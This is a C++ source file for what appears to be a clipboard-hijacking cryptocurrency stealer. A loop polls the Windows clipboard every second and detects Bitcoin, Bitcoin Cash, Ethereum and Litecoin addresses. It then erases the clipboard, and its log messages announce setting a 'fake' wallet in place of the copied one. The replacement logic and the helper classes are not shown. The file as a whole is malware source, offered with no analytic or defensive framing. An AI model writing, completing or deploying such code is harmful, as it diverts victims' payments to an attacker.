#include <iostream>
#include <thread>
#include <windows.h>
#include "ClipBoardOperations.h"
#include "OnlineWalletsOperations.h"

using namespace std;



void Execute_thread() {

	ClipBoardOperations clipboard;
	OnlineWalletsOperations verified_wallet;

	while (true)
	{
	
		string data_inside_clipboard = clipboard.get_data_inside_buffer();
		cout<<"get data inside clipboard:"<< data_inside_clipboard <<"\n";

		cout << "verified data \n";
		if(verified_wallet.execute_validation_bitcoin_and_bitcoincash(data_inside_clipboard)==true ){
			cout << "Detected bitcoin or bitcoincash \n";
			clipboard.erase_data_inside_clipboard();
			cout << "Set fake  bitcoin or bitcoincash wallet \n";
			
		}
		else if (verified_wallet.execute_validation_ethereum(data_inside_clipboard)==true) {
			cout << "Detected etherium \n";
			clipboard.erase_data_inside_clipboard();
			cout << "Set fake  etherium wallet \n";
		}
		else if (verified_wallet.execute_validation_litecoin(data_inside_clipboard)==true) {
			cout << "Detected litecoin \n";
			clipboard.erase_data_inside_clipboard();
			cout << "Set fake  litecoin wallet \n";
		}
    
		cout << "--------------------------------------------------- \n";
		Sleep(1000);
	}


}


int main()
{

	thread execute_first(Execute_thread);
	execute_first.join();


	system("pause");
    return 0;
}

